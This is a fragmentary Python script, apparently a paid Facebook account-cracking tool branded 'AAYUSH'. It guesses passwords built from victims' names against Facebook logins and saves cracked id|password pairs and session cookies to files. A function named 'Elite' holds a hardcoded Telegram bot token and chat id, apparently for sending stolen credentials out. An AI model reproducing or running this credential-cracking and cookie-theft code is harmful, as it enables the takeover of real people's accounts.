...
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "6621233108:AAFraTpcdR6Kcz8zKwQak_dpBe3nsC-tPIk"
        chatid = "6235365485"
...
def p(x):
	print(x)
# •/ [ Linked ]
sys.stdout.write('\x1b]2; •[MR.AAYUSH]•\x07')
# •/ [ Logo ] 
def banner():
    print(f"""   \033[32;1m

   _____ _____.___.____ ___  _________ ___ ___  
  /  _  \\__  |   |    |   \/   _____//   |   \ 
 /  /_\  \/   |   |    |   /\_____  \/    ~    \
/    |    \____   |    |  / /        \    Y    /
\____|__  / ______|______/ /_______  /\___|_  / 
        \/\/                       \/       \/  
\033[91;1m╔════════════════════════════════════════╗
{H}║{P}[{H}•{P}] Author    :{warna} AAYUSH         {N}{H}║
{H}║{P}[{H}•{P}] Status    : {H}PAID {P}     {N}         {H}     ║
{H}║{P}[{H}•{P}] Version   : {H}1.4                     ║
...
def menu():
                    ...
                    #    print('[5] Follow Facebook')
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100009009513784')
                                menu()
                        elif xd in ['0','00']:
...
def M1(ids,names,passlist):
                try:
                        global loop, ok, cp
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mAAYUSH-M1\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;37m[\033[1;32mAAYUSH-OK]\033[1;37m \033[1;32m'+ids+' \033[1;37m| \033[1;32m'+pas+'\033[1;97m')
                                        print(f'\r[🍪]{warna}'+cookie);print(led)
                                        open('/sdcard/AAYUSH_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/AAYUSH_COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        ...
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[AAYUSH-CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AAYUSH-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/AAYUSH-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        global loop, ok, cp
                        animasi = random.choice(["\x1b[1;91mAAYUSH","\x1b[1;92mAAYUSH","\x1b[1;93mAAYUSH","\x1b[1;94mAAYUSH","\x1b[1;95mAAYUSH","\x1b[1;96mAAYUSH","\x1b[1;97mAAYUSH","\x1b[1;91mAAYUSH","\x1b[1;92mAAYUSH","\x1b[1;93mAAYUSH","\x1b[1;94mAAYUSH","\x1b[1;95mAAYUSH","\x1b[1;96mAAYUSH"])
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mAAYUSH-M2\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def M3(ids,names,passlist):
                try:
                        global loop, ok, cp
                        animasi = random.choice(["\x1b[1;91mAAYUSH","\x1b[1;92mAAYUSH","\x1b[1;93mAAYUSH","\x1b[1;94mAAYUSH","\x1b[1;95mAAYUSH","\x1b[1;96mAAYUSH","\x1b[1;97mAAYUSH","\x1b[1;91mAAYUSH","\x1b[1;92mAAYUSH","\x1b[1;93mAAYUSH","\x1b[1;94mAAYUSH","\x1b[1;95mAAYUSH","\x1b[1;96mAAYUSH"])
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mAAYUSH-M3\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
